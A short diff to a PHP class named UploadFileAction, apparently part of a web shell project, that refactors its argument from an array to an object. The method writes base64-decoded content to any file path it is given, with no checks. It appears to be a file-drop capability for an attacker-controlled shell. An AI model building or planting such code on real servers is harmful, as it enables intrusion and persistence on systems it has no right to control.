@@ -3,13 +3,13 @@ namespace WebShell;
 
 class UploadFileAction implements Action
 {
-    public function run(array $args): string
+    public function run(object $args): string
     {
         // Create the target file
-        $fd = fopen($args['filename'], 'w');
+        $fd = fopen($args->filename, 'w');
 
         // Decode the content and write it to the file
-        $content = base64_decode($args['content']);
+        $content = base64_decode($args->content);
         fwrite($fd, $content);
 
         // Return an empty string
